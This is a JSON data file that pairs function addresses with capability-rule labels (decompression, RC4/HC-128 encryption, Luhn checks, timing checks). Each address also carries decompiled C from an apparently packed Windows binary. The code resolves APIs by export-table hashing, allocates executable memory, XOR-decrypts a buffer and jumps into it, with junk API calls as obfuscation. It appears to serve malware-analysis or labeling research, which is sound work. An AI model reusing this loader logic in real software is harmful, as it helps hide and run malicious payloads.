{
    "00401003": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.00401003(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    uchar uVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.0040109f();\n    return uVar1;\n}\n",
        "token_count": 88
    },
    "0040109f": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.0040109f(void)\n\n{\n    int32_t iVar1;\n    int16_t *piVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint lMaximumCount;\n    uint fByPosition;\n    uint lpSemaphoreAttributes;\n    uint32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    for (*0x42406a = _sym.imp.KERNEL32.dll_GetStartupInfoA - (_sym.imp.KERNEL32.dll_GetStartupInfoA & 0xffff);\n        piVar2 = *0x42406a,  **0x42406a != 0x5a4d; *0x42406a = *0x42406a + -0x8000) {\n    }\n    *0x424062 = *0x42406a + *(*0x42406a + 0x1e);\n    iVar1 = (*0x424062)[0x1e];\n    var_24h = *0x42406a + *(*0x42406a + iVar1 + 0x20);\n    for (*0x424066 = *(*0x42406a + iVar1 + 0x18); *0x424066 != 0; *0x424066 = *0x424066 - 1) {\n        var_34h = 0;\n        for (*0x42406e = *var_24h + *0x42406a; **0x42406e != 0; *0x42406e = *0x42406e + (uVar3 | 1)) {\n            uVar4 = (*_sym.imp.KERNEL32.dll_FoldStringA)(0, 0, 0, 0, 0);\n            if (uVar4 != 0) {\n                (*_sym.imp.USER32.dll_GetNextDlgTabItem)(1, 1, uVar4 ^ 0x9b);\n                (*_sym.imp.USER32.dll_GetMenuItemInfoA)(0, uVar4 | 1, uVar4, 1);\n                (*_sym.imp.KERNEL32.dll_CreateSemaphoreW)(0x2d1c, 0xd92001, 1, 1);\n                (*_sym.imp.USER32.dll_GetKeyNameTextA)(0, 1, uVar4);\n            }\n            var_34h = (var_34h << 7 | var_34h >> 0x19) + (**0x42406e ^ 0x44);\n            uVar3 = (*_sym.imp.KERNEL32.dll_FoldStringA)(0, 0, 0, 0, 0);\n            if (uVar3 != 0) {\n                (*_sym.imp.GDI32.dll_ExtCreateRegion)(1, 0x1b000001, 0xffffffff);\n                (*_sym.imp.KERNEL32.dll_QueryPerformanceFrequency)(1);\n            }\n        }\n        if (var_34h == 0x856ef642) {\n            *0x424066 = *(*0x42406a + (*(piVar2 + iVar1 + 0x18) - *0x424066) * 2 + *(piVar2 + iVar1 + 0x24));\n            var_24h = *0x42406a + *(piVar2 + iVar1 + 0x1c);\n            *0x424062 = 0x43900c;\n            uVar5 = (*(*0x42406a + var_24h[*0x424066]))(0, 0x1fc80, 0x1000, 0x40);\n            **0x424062 = uVar5;\n        }\n        var_24h = var_24h + 1;\n    }\n    return 0x82;\n}\n",
        "token_count": 977
    },
    "004021fc": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint32_t fcn.004021fc(void)\n\n{\n    uint32_t uVar1;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uchar *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uchar *var_4h;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_FoldStringA)(0, 0, 0, 0, 0);\n    uVar1 = uVar1 & 0xff;\n    if (uVar1 != '\\0') {\n        (*_sym.imp.MSVCRT.dll__sys_nerr)();\n        (*_sym.imp.USER32.dll_EnumThreadWindows)(uVar1 + 0x257a79c5, uVar1, uVar1 * uVar1);\n        (*_sym.imp.MSVCRT.dll__futime)(uVar1, uVar1 + 0x20, uVar1);\n        (*_sym.imp.MSVCRT.dll__lrotr)();\n    }\n    uVar1 = uVar1 >> 1;\n    var_4h = uVar1 + 0x78388665 ^ 0x787ac64c;\n    var_10h = *(uVar1 + 0x472c9bd2 ^ 0x476f0bc2);\n    for (var_18h = 1; var_18h != 0; var_18h = var_18h + -1) {\n        *var_10h = *var_4h;\n        var_10h = var_10h + 1;\n        var_4h = var_4h + 1;\n    }\n    *0x439010 = var_10h;\n    return uVar1 ^ uVar1 + 0x8b61eedf;\n}\n",
        "token_count": 433
    },
    "00402445": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00402445(uint32_t dwMapFlags)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint idThread;\n    \n    uVar5 = (dwMapFlags & 0xe5e2e1b7) + (dwMapFlags ^ dwMapFlags & 0xe5e2e1b7);\n    uVar1 = ((uVar5 ^ 0xeb) & 0xffff) + 1;\n    uVar4 = uVar1 & 0xffff;\n    uVar5 = (*_sym.imp.KERNEL32.dll_FoldStringA)\n                      (uVar5 * uVar4 + -0x5d4563e0, (uVar5 | uVar4) - 0x9afc, (uVar5 | uVar4) - 0x9afc, \n                       (uVar5 & uVar4) - 0x9a10, uVar5 * uVar4 + -0x5d4563e0);\n    if (uVar5 != 0) {\n        (*_sym.imp.KERNEL32.dll_FreeConsole)();\n        (*_sym.imp.GDI32.dll_GetGlyphIndicesA)\n                  (uVar4, uVar4 + (uVar5 | 0x1700), uVar5 * 2, (uVar1 & 0xed00) - uVar4, uVar1 & 8);\n        (*_sym.imp.USER32.dll_GetClassLongW)(uVar1 & 0xef3b | uVar5, uVar4 * -0x4438ffff);\n    }\n    uVar3 = (uVar4 ^ 0x694443ea) & 0xffff | uVar4;\n    uVar5 = fcn.004023c2(uVar4 / 9, 0, uVar4 / 9);\n    uVar1 = uVar3 >> 2;\n    uVar2 = uVar3 >> 3;\n    uVar4 = (*_sym.imp.KERNEL32.dll_FoldStringA)\n                      (uVar2 + uVar1 + -0x527e, 0, 0, uVar2 + uVar1 + -0x527e, uVar3 * uVar2 + -0x17a0ed02);\n    uVar4 = uVar4 & 0xffff;\n    if (uVar4 != 0) {\n        (*_sym.imp.MSVCRT.dll__wsopen)(uVar2, uVar4 + uVar1 * 0x1bbe21fa, (uVar5 | uVar4) * uVar2);\n        (*_sym.imp.USER32.dll_PostThreadMessageA)(uVar1 + (uVar4 | uVar5), uVar2 + 0x26, uVar1, -uVar2);\n        (*_sym.imp.KERNEL32.dll_CreateJobObjectW)(uVar2 - 0xcf00, uVar5 - 0x4855);\n        (*_sym.imp.USER32.dll_OffsetRect)(uVar2, (uVar2 ^ uVar5) - uVar1, (uVar1 | 0x8b6f) & uVar4);\n        (*_sym.imp.USER32.dll_SwapMouseButton)(uVar4);\n    }\n    return uVar5;\n}\n",
        "token_count": 749
    },
    "0040293b": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040293b(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint var_28h;\n    uint wNewWord;\n    uint Locale;\n    uint lpDateStr;\n    int32_t var_18h;\n    uchar *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uchar *var_8h;\n    uint var_4h;\n    \n    uVar2 = (arg_8h & 0xffff) - 1 & 0xffff;\n    uVar3 = uVar2 >> 1 & 0xff;\n    var_8h = (uVar3 ^ (uVar3 ^ 0xaea0)) + 0x7837d7c5 ^ 0x787b27b5;\n    var_14h = *(((uVar2 ^ uVar2 >> 1) + 0x472c8ede ^ 0x476f0bc2) + ((uVar2 - uVar3) + -0x854) * 4);\n    for (var_18h = (uVar2 & arg_8h & 0xffff) + 0x10cd; var_18h != (uVar3 - (uVar2 >> 1)) + 0x400; var_18h = var_18h + -1\n        ) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_FoldStringA)(0, 0, 0, 0, 0);\n        if (uVar1 != 0) {\n            (*_sym.imp.USER32.dll_SetClassWord)(0, 0, uVar1 ^ 0x97bf838c);\n            (*_sym.imp.USER32.dll_SetFocus)(0);\n            (*_sym.imp.KERNEL32.dll_GetDateFormatW)\n                      (uVar1 | 0xcf, uVar1 - (uVar1 & 0xf92e0c60), -uVar1, 0xfffff113, 0xd2, 0);\n        }\n        *var_14h = *var_8h;\n        var_14h = var_14h + 1;\n        var_8h = var_8h + 1;\n    }\n    *((uVar3 | arg_8h & 0xffff) + 0x472c92d7 ^ 0x476f0bc2) = var_14h;\n    return (arg_8h ^ 0xa15600) / (arg_8h ^ 0xa15600) & 0xffff;\n}\n",
        "token_count": 584
    },
    "00402e15": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402e15(uint arg_8h, uint noname_1, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_FoldStringA)(0, 0, 0, 0, 0);\n    uVar1 = uVar1 & 0xff;\n    if (uVar1 != '\\0') {\n        (*_sym.imp.KERNEL32.dll_SetThreadPriorityBoost)(uVar1 + 0xcd408bec, uVar1 * uVar1 * 0x33f4315c);\n        (*_sym.imp.KERNEL32.dll_SetComputerNameExW)(0x135b0, 0xee0f);\n    }\n    arg_10h = arg_10h & 0xff;\n    fcn.00402445(0x9ad8);\n    if (arg_10h == 0x49) {\n        fcn.00402f6e(arg_10h | 0xbc00);\n    }\n    return arg_10h - 1;\n}\n",
        "token_count": 270
    },
    "00403298": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint64_t fcn.00403298(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t lpSrcStr;\n    \n    lpSrcStr = (*_sym.imp.KERNEL32.dll_FoldStringA)(0, 0, 0, 0, 0);\n    if (lpSrcStr != 0) {\n        (*_sym.imp.GDI32.dll_EudcUnloadLinkW)(0, lpSrcStr);\n        (*_sym.imp.KERNEL32.dll_OpenMutexA)(0, 0, lpSrcStr);\n        lpSrcStr = lpSrcStr + -1;\n    }\n    uVar1 = 0;\n    if (lpSrcStr == 0) {\n        uVar1 = fcn.00401b18(0, 0, 0, 0);\n    }\n    iVar2 = (uVar1 & 0xffff) << 0x18;\n    if (uVar1 == 0) {\n        fcn.00402d1c(iVar2, iVar2, 0);\n    }\n    uVar1 = (uVar1 & 0xffff) >> 2;\n    return CONCAT44((uVar1 & 0x410f00) >> 3, uVar1) & 0xffffffff00410f00 | 0xff0000000000;\n}\n",
        "token_count": 294
    },
    "004033bf": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nulong __cdecl fcn.004033bf(uint32_t arg_8h)\n\n{\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00402676((arg_8h & 0x1aa0) * 0x1aa0 + -1, arg_8h * '\\x02');\n    return CONCAT44((arg_8h & 0xff) * 0xd500, 0x353f);\n}\n",
        "token_count": 120
    },
    "00403481": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403481(uint32_t arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    uchar *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar3 = arg_8h & 0xff;\n    puVar1 = uVar3 * arg_8h + 0x78388565 ^ 0x7878c575;\n    uVar2 = arg_8h >> 2;\n    var_ch = *(((arg_8h ^ uVar3) + 0xebf358ac ^ 0xebb0c8a0) +\n              ((uVar2 & 0xff) + uVar3 * (uVar2 & 0xff) * 0xef10000 + 0x43bffffc) * 4);\n    for (var_10h = (uVar2 & 0xff) + 0x117a8; var_10h != arg_10h - 0x10; var_10h = var_10h + -1) {\n        *(var_ch + ((arg_10h & 0xffff) - 0x10)) = *puVar1;\n        var_ch = var_ch + 1;\n        puVar1 = puVar1 + 1;\n    }\n    *0x439010 = var_ch;\n    return 0;\n}\n",
        "token_count": 381
    },
    "004017bf": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nulong fcn.004017bf(void)\n\n{\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.004030ff();\n    return 0xffffff6e00000010;\n}\n",
        "token_count": 51
    },
    "0040191c": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040191c(uint noname_0, uint32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint32_t *var_8h;\n    uint var_4h;\n    \n    var_8h = *0x43900c;\n    for (var_ch = *0x439014; var_ch != 0; var_ch = var_ch - ((uVar4 ^ uVar2) + 0xd000113a)) {\n        uVar4 = ((arg_ch | 0x30000000) ^ arg_ch) - 1;\n        uVar3 = uVar4 >> 1;\n        uVar1 = uVar3 >> 3;\n        *var_8h = var_8h[(uVar4 | uVar3 & 0xffff) + 0xd0000001] ^ (uVar4 ^ uVar3 & 0xffff) + 0xa1d5e8e8;\n        uVar2 = (uVar4 ^ uVar1) + 0x3138;\n        var_8h[1] = var_8h[(uVar1 | uVar4) + 0xd0000002] ^ 0xac1abacd;\n        var_8h = var_8h + uVar2 * uVar1 + -0x226eec0;\n    }\n    (**0x43900c)();\n    return 0xd;\n}\n",
        "token_count": 398
    },
    "00401bd2": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nint64_t __cdecl fcn.00401bd2(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint8_t uVar4;\n    int32_t iVar5;\n    uint16_t uVar6;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint lpDestStr;\n    uint var_34h;\n    uint cchDest;\n    uint lpSrcStr;\n    uint lpszDescription;\n    uint dwMapFlags;\n    uint lpExitCode;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint8_t *var_ch;\n    uint8_t *var_8h;\n    uint var_4h;\n    \n    var_ch = *(((arg_ch + 0x5f) - 0x5f) * 4 + 0x43900c);\n    var_10h = (arg_ch & 0xff) + 0x1fc80;\n    var_8h = var_ch;\n    while (var_10h != 0) {\n        if (var_10h < arg_8h + 8) {\n            *var_ch = *var_8h;\n            var_ch = var_ch + 1;\n            var_8h = var_8h + 1;\n            uVar2 = (*_sym.imp.KERNEL32.dll_FoldStringA)(0, 0, 0, 0, 0);\n            if (uVar2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GetExitCodeThread)(uVar2 ^ 1, uVar2 ^ 0xc850);\n                (*_sym.imp.KERNEL32.dll_QueueUserWorkItem)(1, uVar2 & 0xc58b, 1);\n                (*_sym.imp.MSVCRT.dll__mbsnicmp)(0x29ec9c5e, 0);\n                (*_sym.imp.GDI32.dll_SetWinMetaFileBits)(uVar2, 0, uVar2 | 0xfc000000, 1);\n                (*_sym.imp.GDI32.dll_GetEnhMetaFileDescriptionA)(0, uVar2, 0);\n            }\n            var_10h = var_10h + -1;\n        }\n        else {\n            uVar4 = arg_8h;\n            uVar1 = arg_ch ^ 0x67;\n            uVar1 = (*_sym.imp.KERNEL32.dll_FoldStringA)\n                              ((uVar1 ^ 0xff67) - 0xff00, (uVar1 | 0xff67) - 0xff67, (uVar1 | 0x67) - 0x67, \n                               uVar1 * 0xff67 + -0x66c271, 0);\n            if (uVar1 != 0) {\n                (*_sym.imp.USER32.dll_SendIMEMessageExW)(uVar1 * 0x3b64, 0xff67);\n            }\n            uVar6 = -arg_8h - 0x99;\n            uVar2 = (uVar1 << 8) >> 3;\n            iVar3 = *var_8h * 0x1000000 + *var_8h * 0x10000 + (uVar6 - 0xff67) +\n                    var_8h[(uVar1 | 0xff67) - 0xff67] * 0x100 + var_8h[uVar2 & 0xff | uVar1 << 8];\n            iVar5 = ((uVar4 * uVar4 + 0x6b) - uVar2) + -0x6b;\n            uVar6 = uVar6 - arg_8h;\n            var_44h = uVar1 << 8;\n            if ((*(var_8h + (uVar1 * 0x100 * uVar6 * 4 - iVar5)) == iVar3) &&\n               (*(var_8h + (((arg_8h ^ arg_8h & 0xffff) + 1) * 4 - iVar5)) == iVar3)) {\n                var_44h = 1;\n            }\n            if (var_44h == uVar1 * 0x614100 * arg_8h * uVar6) {\n                uVar4 = uVar4 & 0xbc;\n                var_ch[-uVar4] = *var_8h;\n                var_ch = var_ch + 1;\n                var_8h = var_8h + uVar4 + 1;\n                var_10h = var_10h - (1 - uVar4);\n            }\n            else {\n                var_10h = var_10h + -8;\n                var_8h = var_8h + 8;\n            }\n        }\n    }\n    *((arg_ch & 0xffff) + 0x3859107f ^ 0x381a806b) = var_ch - *0x43900c >> 3;\n    return (arg_ch & 0xffff) - 1 << 0x20;\n}\n",
        "token_count": 1270
    },
    "00402676": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402676(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uchar *var_10h;\n    uint var_ch;\n    uchar *var_8h;\n    uint var_4h;\n    \n    uVar3 = (arg_ch & 0xff) * 0x100;\n    uVar2 = arg_ch * uVar3;\n    var_8h = (uVar2 | uVar3) + 0x78388665 ^ 0x7879e689;\n    var_10h = *((uVar3 >> 1) + uVar3 + 0x472c9bd2 ^ 0x476f0bc2);\n    uVar1 = uVar3 * -0x3424;\n    for (var_14h = uVar3 + uVar3 % 0x1e + 0xcb66; var_14h != (uVar3 & uVar1); var_14h = var_14h - 1) {\n        *var_10h = *var_8h;\n        var_10h = var_10h + 1;\n        var_8h = var_8h + 1;\n    }\n    *(uVar2 * uVar1 + 0x472c9bd2 ^ 0x476f0bc2) = var_10h;\n    return uVar2 - (arg_8h | 0x3500);\n}\n",
        "token_count": 389
    },
    "00402d98": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint fcn.00402d98(void)\n\n{\n    uint arg_8h;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h = fcn.004017bf();\n    fcn.0040302e(arg_8h, arg_8h, 0x83);\n    return 0x83;\n}\n",
        "token_count": 78
    },
    "00401b18": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401b18(int32_t arg_8h, uint arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint var_4h;\n    \n    if ((arg_10h & 0xffff) == 0) {\n        fcn.0040293b(((arg_10h & 0xff | 0x4547) + arg_8h & 0xffff) >> 3);\n    }\n    return (arg_14h ^ 0xc000) * (arg_10h & 0xffff) * 0x100;\n}\n",
        "token_count": 138
    },
    "00402cc0": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nuint32_t fcn.00402cc0(void)\n\n{\n    uint8_t uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.0040289e();\n    return (uVar1 | 0x6b) % 0xf7eb;\n}\n",
        "token_count": 64
    },
    "00402b8a": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nuint32_t fcn.00402b8a(uint32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t arg_8h;\n    \n    arg_8h = (param_1 | 0xff2000) + 0xb480000 & 0xffff;\n    uVar1 = fcn.004031b8(arg_8h, 0x63c00, arg_8h, arg_8h);\n    return arg_8h / uVar1;\n}\n",
        "token_count": 112
    },
    "00402beb": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00402beb(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uint dwData;\n    \n    uVar2 = arg_ch >> 3 & 0xff;\n    arg_ch = arg_ch - 1;\n    uVar1 = (*_sym.imp.KERNEL32.dll_FoldStringA)\n                      ((uVar2 | arg_ch & 0xff) - 2, arg_ch * (arg_8h & 0xffff), 0, (arg_8h & 0xffff) + uVar2, 0);\n    if (uVar1 == 0) {\n        fcn.00402cc0();\n    }\n    else {\n        (*_sym.imp.GDI32.dll_ResetDCW)(uVar2, uVar1);\n        (*_sym.imp.MSVCRT.dll__sys_errlist)(arg_ch);\n        (*_sym.imp.USER32.dll_mouse_event)\n                  (uVar2 * (uVar2 | 0x1211), uVar1 & 0x3700, arg_ch, (arg_ch & 0xff) + arg_ch + 0x77000000, arg_ch);\n    }\n    return uVar2;\n}\n",
        "token_count": 285
    },
    "0040302e": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nuint64_t __cdecl fcn.0040302e(uint arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_ch = ((arg_10h ^ 0xd5fc) & 0xff | 0xfc) & arg_ch;\n    uVar2 = fcn.00403481(arg_ch, 0xd5fc, arg_ch);\n    iVar1 = fcn.00402beb(uVar2 & 0xffff, 3, uVar2 & 0xffff);\n    return CONCAT14(arg_8h, iVar1 + 1) ^ 0x1d00000000;\n}\n",
        "token_count": 171
    },
    "00402d1c": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nuint fcn.00402d1c(void)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.0040186b(0x9d);\n    return 0x5e437b9;\n}\n",
        "token_count": 54
    },
    "0040186b": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint64_t __cdecl fcn.0040186b(uint32_t arg_8h)\n\n{\n    uint32_t noname_1;\n    uint32_t uVar1;\n    uint var_4h;\n    \n    uVar1 = arg_8h | 0xe;\n    uVar1 = (*_sym.imp.KERNEL32.dll_FoldStringA)\n                      ((arg_8h | uVar1) - 0x9f, arg_8h - 0x9d, 0, arg_8h + uVar1 + -0x13c, (arg_8h & uVar1) - 0x9d);\n    uVar1 = uVar1 & 0xff;\n    if (uVar1 != '\\0') {\n        (*_sym.imp.MSVCRT.dll__futime)();\n    }\n    noname_1 = arg_8h * (arg_8h ^ uVar1);\n    if (uVar1 == '\\0') {\n        noname_1 = fcn.00402e15(uVar1, noname_1, noname_1);\n    }\n    return CONCAT44(arg_8h + (noname_1 & 0xff), noname_1) & 0xffffffff000000ff;\n}\n",
        "token_count": 278
    },
    "004023c2": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004023c2(uint arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    uint var_4h;\n    \n    fcn.00401bd2(0, arg_ch | 0x11860000);\n    return arg_ch | 0x11860000;\n}\n",
        "token_count": 74
    },
    "00402f6e": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00402f6e(uint32_t arg_8h)\n\n{\n    uint32_t arg_ch;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint var_4h;\n    \n    uVar1 = arg_8h & 0xff;\n    uVar2 = uVar1 + arg_8h * -0x8560 & 0xff;\n    arg_ch = (uVar1 + 0x44f30000 & 0xff) - 1 & 0xff;\n    if (uVar2 == 0xe9) {\n        fcn.0040191c(uVar1 * 0xea7d00, arg_ch, uVar1 * 0xea7d00, arg_ch);\n    }\n    return uVar2;\n}\n",
        "token_count": 179
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint main(void)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00402d98();\n    return 1;\n}\n",
        "token_count": 36
    },
    "0040289e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040289e(void)\n\n{\n    uchar uVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.004033bf(0xc48b00);\n    fcn.00402b8a(0, 0, uVar1);\n    return 0;\n}\n",
        "token_count": 81
    },
    "004030ff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint fcn.004030ff(void)\n\n{\n    uint uVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00401003(1, 0, 0x86001f80, 0xfa);\n    return uVar1;\n}\n",
        "token_count": 73
    },
    "004031b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\nulong __cdecl fcn.004031b8(uint arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar3 = arg_10h & 0xffff;\n    if (arg_14h == 0x2000) {\n        arg_14h = fcn.004021fc();\n    }\n    arg_14h = arg_14h | arg_10h;\n    uVar2 = uVar3;\n    if (arg_14h == 0x8b61eedf) {\n        uVar2 = fcn.00403298();\n    }\n    cVar1 = (*_sym.imp.KERNEL32.dll_FoldStringA)\n                      ((arg_14h - uVar3) + 0x749e3121, (uVar3 ^ arg_ch & 0xffff) - 0x1c00, 0, \n                       (arg_ch & 0xffff) * (arg_8h ^ uVar3), (arg_ch & 0xffff | arg_14h) + 0x749e0121);\n    if (cVar1 != '\\0') {\n        (*_sym.imp.GDI32.dll_FlattenPath)((uVar3 ^ 0xb5000000) * uVar2);\n    }\n    return CONCAT44((arg_14h + 100) - ((arg_ch & 0xffff) - 1 & 0xffff), arg_14h);\n}\n",
        "token_count": 366
    }
}